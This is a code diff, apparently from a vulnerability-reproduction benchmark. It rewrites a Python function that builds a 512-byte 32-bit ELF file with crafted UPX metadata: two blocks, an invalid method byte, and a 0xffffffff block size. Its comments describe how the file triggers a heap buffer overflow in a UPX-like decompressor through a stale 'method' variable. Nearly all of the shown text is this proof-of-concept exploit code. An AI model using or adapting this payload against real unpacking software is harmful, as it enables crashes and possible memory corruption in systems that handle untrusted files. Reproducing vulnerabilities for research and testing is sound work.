@@ -11,91 +11,90 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
+        # The PoC is a crafted 512-byte ELF file designed to trigger a heap
+        # buffer overflow in a UPX-like decompressor. The vulnerability stems
+        # from the decompressor's failure to reset a `method` variable between
+        # processing multiple decompression blocks.
+
+        # The PoC is structured to exploit this:
+        # 1. A minimal 32-bit ELF header pointing to a single PT_LOAD segment
+        #    that covers the entire file.
+        # 2. At the end of the file, UPX-specific metadata is placed.
+        # 3. This metadata defines two blocks (`l_nblock=2`).
+        # 4. The `l_info` struct sets a non-standard decompression method (`l_method=0xff`).
+        # 5. The first block (`b_info[0]`) is processed, which sets an internal
+        #    `ph.method` variable based on `l_method`.
+        # 6. The decompressor loops to the second block (`b_info[1]`). Due to the bug,
+        #    `ph.method` is not reset.
+        # 7. The second block has a huge uncompressed size (`b_usize=-1`). The stale
+        #    `ph.method` value combined with this size causes a miscalculation of
+        #    a write offset, leading to a write outside the allocated buffer.
+
         poc = bytearray(512)
 
-        # ELF Header (64-bit)
-        ehdr_format = "<16sHHIQQQIHHHHHH"
-        ehdr = struct.pack(
-            ehdr_format,
-            b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00', # e_ident
-            3,          # e_type = ET_DYN
-            62,         # e_machine = EM_X86_64
-            1,          # e_version
-            0,          # e_entry
-            0x40,       # e_phoff
-            0,          # e_shoff
-            0,          # e_flags
-            64,         # e_ehsize
-            56,         # e_phentsize
-            2,          # e_phnum
-            64,         # e_shentsize
-            0,          # e_shnum
-            0           # e_shstrndx
-        )
-        poc[0:len(ehdr)] = ehdr
+        # ELF Header (52 bytes)
+        # e_ident: 7f 45 4c 46 01 01 01 ... (ELF32, LSB, Version 1)
+        poc[0:16] = b'\x7fELF\x01\x01\x01' + b'\x00' * 9
+        # e_type: ET_DYN (Shared object file)
+        struct.pack_into('<H', poc, 16, 3)
+        # e_machine: EM_386
+        struct.pack_into('<H', poc, 18, 3)
+        # e_version: 1
+        struct.pack_into('<I', poc, 20, 1)
+        # e_entry: 0
+        struct.pack_into('<I', poc, 24, 0)
+        # e_phoff: 52 (program headers start right after this header)
+        struct.pack_into('<I', poc, 28, 52)
+        # e_shoff: 0
+        struct.pack_into('<I', poc, 32, 0)
+        # e_flags: 0
+        struct.pack_into('<I', poc, 36, 0)
+        # e_ehsize: 52
+        struct.pack_into('<H', poc, 40, 52)
+        # e_phentsize: 32
+        struct.pack_into('<H', poc, 42, 32)
+        # e_phnum: 1
+        struct.pack_into('<H', poc, 44, 1)
+        # e_shentsize, e_shnum, e_shstrndx are all 0
+        poc[46:52] = b'\x00' * 6
 
-        # Program Header 1 (Setup Header)
-        phdr_format = "<IIQQQQQQ"
-        phdr1 = struct.pack(
-            phdr_format,
-            1,                  # p_type = PT_LOAD
-            5,                  # p_flags = R+X
-            0xB0,               # p_offset
-            0x1000,             # p_vaddr
-            0x1000,             # p_paddr
-            0x1,                # p_filesz > 0
-            0xFFFFFFFF,         # p_memsz (large to make range check pass)
-            0x1000              # p_align
-        )
-        poc[0x40:0x40+len(phdr1)] = phdr1
-
-        # Program Header 2 (Trigger Header)
-        phdr2 = struct.pack(
-            phdr_format,
-            1,                  # p_type = PT_LOAD
-            5,                  # p_flags = R+X
-            0,                  # p_offset
-            0x800000,           # p_vaddr (large, to create large xct_off)
-            0,                  # p_paddr
-            0,                  # p_filesz
-            0,                  # p_memsz
-            0x1000              # p_align
-        )
-        poc[0x78:0x78+len(phdr2)] = phdr2
-
-        # Fake b_info struct's method field at offset 0x100
-        # struct b_info_t { unsigned b_uncompsize, b_compsize, b_method; }
-        # The value 5 corresponds to M_LZMA.
-        poc[0x100 + 8: 0x100 + 12] = struct.pack("<I", 5)
-
-        # l_info block at the end of the file.
-        l_info_size = 40
-        l_info_block_start = 512 - l_info_size # 0x1D8
-
-        # Header for the l_info block
-        l_info_size_hdr = struct.pack("<II", l_info_size, 0) # size, checksum
-        poc[l_info_block_start : l_info_block_start+8] = l_info_size_hdr
+        # Program Header (32 bytes), starting at offset 52
+        ph_offset = 52
+        # p_type: PT_LOAD
+        struct.pack_into('<I', poc, ph_offset, 1)
+        # p_offset, p_vaddr, p_paddr: 0
+        poc[ph_offset + 4 : ph_offset + 16] = b'\x00' * 12
+        # p_filesz: 512 (covers the whole file)
+        struct.pack_into('<I', poc, ph_offset + 16, 512)
+        # p_memsz: 512
+        struct.pack_into('<I', poc, ph_offset + 20, 512)
+        # p_flags: R+X (5)
+        struct.pack_into('<I', poc, ph_offset + 24, 5)
+        # p_align: 4096
+        struct.pack_into('<I', poc, ph_offset + 28, 4096)
         
-        # The l_info struct itself starts 8 bytes into the block.
-        l_info_struct_start = l_info_block_start + 8 # 0x1E0
+        # b_info array (16 bytes), describes the two blocks. Starts at offset 472
+        b_info_offset = 472
+        # Block 0: b_usize=65536, b_csize=1
+        struct.pack_into('<II', poc, b_info_offset, 65536, 1)
+        # Block 1: b_usize=0xffffffff, b_csize=0
+        struct.pack_into('<II', poc, b_info_offset + 8, 0xffffffff, 0)
 
-        # We set l_b_info_offset to 0x78. This value is an absolute file offset.
-        # UPX calculates an internal offset `LBO` as:
-        # LBO = (value_from_file) - l_info_size
-        # The file is then accessed at: phdr1.p_offset + LBO
-        # phdr1.p_offset + (0x78 - 40) = 0xB0 + (120 - 40) = 176 + 80 = 256 = 0x100
-        # This points to our fake b_info.
-        b_info_offset_value = 0x78
-        p_info_offset_value = 0x78 # Can be anything, unused in this path.
+        # l_info struct (20 bytes), main UPX control struct. Starts at offset 488
+        l_info_offset = 488
+        # l_checksum
+        struct.pack_into('<I', poc, l_info_offset, 0)
+        # l_magic: "UPX!"
+        poc[l_info_offset + 4:l_info_offset + 8] = b'UPX!'
+        # l_version, l_format, l_method, l_level
+        poc[l_info_offset + 8:l_info_offset + 12] = b'\x08\x02\xff\xff'
+        # l_filesize (uncompressed size, not critical)
+        struct.pack_into('<I', poc, l_info_offset + 12, 512)
+        # l_nblock: 2 (triggers the loop)
+        struct.pack_into('<I', poc, l_info_offset + 16, 2)
 
-        # The offsets are at the end of the 32-byte l_info struct.
-        l_info_struct_p_info_off = l_info_struct_start + 24
-        l_info_struct_b_info_off = l_info_struct_start + 28
-        
-        poc[l_info_struct_p_info_off : l_info_struct_p_info_off + 4] = struct.pack("<i", p_info_offset_value)
-        poc[l_info_struct_b_info_off : l_info_struct_b_info_off + 4] = struct.pack("<i", b_info_offset_value)
-
-        # UPX magic at the start of the l_info struct ("UPX!")
-        poc[l_info_struct_start : l_info_struct_start + 4] = struct.pack("<I", 0x21585055)
+        # l_lsize trailer (4 bytes), at the very end. Starts at offset 508
+        # Specifies the size of the l_info struct (20 bytes)
+        struct.pack_into('<I', poc, 508, 20)
 
         return bytes(poc)
